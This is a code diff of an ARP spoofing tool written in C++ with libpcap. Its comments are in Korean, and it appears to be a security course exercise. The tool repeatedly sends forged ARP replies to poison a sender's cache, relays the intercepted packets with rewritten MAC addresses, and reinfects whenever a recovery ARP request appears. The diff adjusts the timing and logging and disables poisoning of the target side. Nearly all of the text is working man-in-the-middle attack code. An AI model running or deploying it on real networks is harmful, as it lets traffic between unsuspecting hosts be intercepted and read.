@@ -55,7 +55,7 @@ void signal_handler (int sig)
     printf("\nInterrupt Executed : %d\n",sig);
     runThread = false;
 	sleep(2);
-	exit(sig);
+	return;
 }
 
 void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
@@ -159,7 +159,7 @@ bool isSpoofed(const u_char *replyPacket, FlowInfo info){
 	EthHdr *eth = (struct EthHdr *)replyPacket;
 	if (eth->type() == EthHdr::Ip4){
 		EthIpPacket *ipPacket = (struct EthIpPacket *)replyPacket;
-		
+
 		// Udp의 broadcast -> relay 필요 없음
 		if (ipPacket->ip_.p() == IpHdr::Udp){
 			if (ipPacket->eth_.dmac() == info.attackerMac)
@@ -172,10 +172,9 @@ bool isSpoofed(const u_char *replyPacket, FlowInfo info){
 
 		// sender가 보낸 패킷 -> spoof 됨 -> relay 필요
 		if (ipPacket->ip_.sip() == info.senderIp && ipPacket->eth_.smac() == info.senderMac){
-			// // 원래 나한테 보내려던 패킷 -> relay 필요 없음
-			// if (ipPacket->ip_.dip() == info.attackerIp)
-			// 	return false;
-			printf("relay\n");
+			// 원래 나한테 보내려던 패킷 -> relay 필요 없음
+			if (ipPacket->ip_.dip() == info.attackerIp)
+				return false;
 			return true;
 		}
 	}
@@ -187,18 +186,10 @@ bool isRecovered(const u_char *replyPacket, FlowInfo info){
 	if (eth->type() == EthHdr::Arp){
 		EthArpPacket *arpPacket = (struct EthArpPacket *)replyPacket;
 		if (arpPacket->arp_.op() == ArpHdr::Request){
-			// // recover 위해서 broadcast 하는 경우 -> recover 필요
-			// if (arpPacket->eth_.dmac() == info.attackerMac)
-			// 	return true;
-			// if (arpPacket->eth_.dmac() == info.targetMac)
-			// 	return true;
-			// if (arpPacket->eth_.dmac() == Mac::broadcastMac())
-			// 	return true;
+			// // target mac recover 위해서 broadcast 하는 경우 -> recover 필요
 			if (arpPacket->arp_.tip() == info.targetIp){
-				printf("reinfect\n");
 				return true;
 			}
-				
 		}
 	}
 	return false;
@@ -208,15 +199,16 @@ void Infect(pcap_t *handle){
 	while(runThread){
 		for(auto iter : flows){
 			SendArpPacket(handle, iter.infectPkt);
-			printf("infect\n");
-			sleep(1);
+			printf("Infect : [%s]\n",std::string(iter.senderIp).c_str());
+			sleep(0.1);
 		}
-		sleep(5);
+		sleep(20);
 	}
 }
 
 void ReInfect(pcap_t *handle, FlowInfo info){
 	SendArpPacket(handle, info.infectPkt);
+	printf("ReInfect : [%s]\n",std::string(info.senderIp).c_str());
 }
 
 void Relay(pcap_t* handle, struct pcap_pkthdr* header, const u_char *replyPacket, FlowInfo info){
@@ -224,13 +216,13 @@ void Relay(pcap_t* handle, struct pcap_pkthdr* header, const u_char *replyPacket
 	ipPacket->eth_.smac_ = info.attackerMac;
 	ipPacket->eth_.dmac_ = info.targetMac;
 	SendIpPacket(handle, *ipPacket, header->len);
+	printf("Relay : [%s]\n",std::string(info.senderIp).c_str());
 }
 
 void Receive(pcap_t* handle){
 	struct pcap_pkthdr* header;
 	const u_char* replyPacket;
 	while(runThread){
-
 		int res = pcap_next_ex(handle, &header, &replyPacket);
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
@@ -245,7 +237,6 @@ void Receive(pcap_t* handle){
 			// recovered -> reinfect
 			if(isRecovered(replyPacket,iter))
 				ReInfect(handle, iter);
-			sleep(1);
 		}
 	}
 }
@@ -305,25 +296,29 @@ int main(int argc, char* argv[]) {
 		flows.push_back(info);
 		printf("Making Sender Infect Flow Done!! \n");
 
-		// target도 감염위해 Flow 생성
-		info.senderIp = Ip(argv[2*i+1]);
-		info.targetIp = Ip(argv[2*i]);
-		info.senderMac = arpTable[info.senderIp];
-		info.targetMac = arpTable[info.targetIp];
-		info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
-		flows.push_back(info);
+		// // target도 감염위해 Flow 생성
+		// info.senderIp = Ip(argv[2*i+1]);
+		// info.targetIp = Ip(argv[2*i]);
+		// info.senderMac = arpTable[info.senderIp];
+		// info.targetMac = arpTable[info.targetIp];
+		// info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
+		// flows.push_back(info);
 
 		printf("Making Target Infect Flow Done!! \n");
 
 	}
 	printf("\n-------------Start Spoofing!!!!-------------\n");
-	signal(SIGINT, signal_handler);
 	std::thread infect_t(Infect, handle);
 	std::thread receive_t(Receive, handle);
 	
+	signal(SIGINT, signal_handler);
+
 	infect_t.join();
 	receive_t.join();
 
-
 	pcap_close(handle);
+
+	printf("\n-------------End Spoofing!!!!-------------\n");
+
+
 }
